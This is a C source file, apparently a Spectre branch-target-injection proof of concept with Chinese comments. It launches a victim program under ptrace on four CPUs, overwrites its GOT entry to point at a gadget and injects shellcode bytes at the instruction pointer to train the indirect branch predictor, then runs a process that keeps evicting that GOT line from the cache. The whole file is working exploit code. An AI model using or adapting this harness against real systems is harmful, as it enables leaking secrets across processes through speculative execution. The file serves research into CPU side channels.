#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <asm/ptrace-abi.h> /*ORIG_EAX*/
#include <sys/reg.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <semaphore.h>
#include <x86intrin.h>
#include "common.h"

void setcpu(int cpu){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(getpid() , sizeof(mask), &mask);
}

void trainer(char *exe, unsigned plt, unsigned gadget, unsigned *got,int cpu){
    pid_t pid;
    int res;
    int stat, i, j;
    unsigned longs, longs1, got_out; 
    unsigned long ip;   
    struct user_regs_struct regs;

    pid = fork();
    if(pid == -1){
        error_log("fork");
    }

    if(pid == 0){
        setcpu(cpu);                                //设置子进程的cpu亲和度
        res = ptrace(PTRACE_TRACEME, 0, 0, 0);
        if(res == -1){
            error_log("ptrace");
        }
        execl(exe, exe, "qiutianshu", (char*)0);    //子进程中启动victim
    }

    waitpid(pid, &stat, 0);                         //捕获子进程发出的SIGTRAP信号，获得子进程的控制权
    ptrace(PTRACE_GETREGS, pid, 0, &regs);          //读取17个寄存器的值
    ip = regs.rip;                                  //当前指令寄存器的位置，这里只考虑x86_64的情况
    longs = ptrace(PTRACE_PEEKDATA, pid, plt+2, 0);
    got_out = longs + plt + 6;                         //got表项地址
    *got = got_out;
    
    ptrace(PTRACE_POKEDATA, pid, got_out, gadget);     //gadget地址写入got位置
    ptrace(PTRACE_POKEDATA, pid, gadget, 0xc3c3c3c3);  //gadget地址处写入连续四个ret指令

    union u
    {
        unsigned long val;
        char shellcode[16];                                    
    }loop;
    
    memcpy(loop.shellcode, "\xb8\x60\x07\x40",4);       //mov eax, 0x400760
    ptrace(PTRACE_POKEDATA, pid, ip, loop.val);       
    memcpy(loop.shellcode, "\x00\xff\xd0\xeb",4);       //call eax
    ptrace(PTRACE_POKEDATA, pid, ip + 4, loop.val);
    memcpy(loop.shellcode, "\xfc\x90\x90\x90",4);       //jmp back,mop,nop,nop
    ptrace(PTRACE_POKEDATA, pid, ip + 8, loop.val);
//    for(;;)pause();
    ptrace(PTRACE_DETACH, pid, 0, 0);                   //调试进程分离，子进程独立运行
}

void evictor(unsigned got){
    pid_t pid;
    pid = fork();
    if(pid == 0){
        for(;;){
//            _mm_clflush(got);                           //刷新各个core的L1、L2，刷新L3
//            for(volatile int z = 0; z < 100; z++){}     //延迟
            evict(got);
        }
    }

}

/**
 * 接收参数：victim文件，sprintf@plt(0x400760)，gadget(0x400877)地址
*/
int main(int argc, char *argv[]){
    unsigned plt, gadget,got;
    char *exe;
    int i;

    if(argc != 4){
        fprintf(stderr, "Usage: %s file strcat@plt gadget", argv[0]);
        exit(EXIT_FAILURE);
    }
    exe = argv[1];                           //victim
    plt = get_long(argv[2]);                 //strcat@plt
    gadget = get_long(argv[3]);              //gadget

    for(i = 0; i < 4; i++){
        trainer(exe, plt, gadget, &got, i);  //训练indirect jump
        printf("cpu%d: got is %x\n", i, got);
    }

    evictor(got);                            //刷新各级缓存的got数据
    for(;;)pause();                          //父进程停在这里
    exit(EXIT_SUCCESS);
}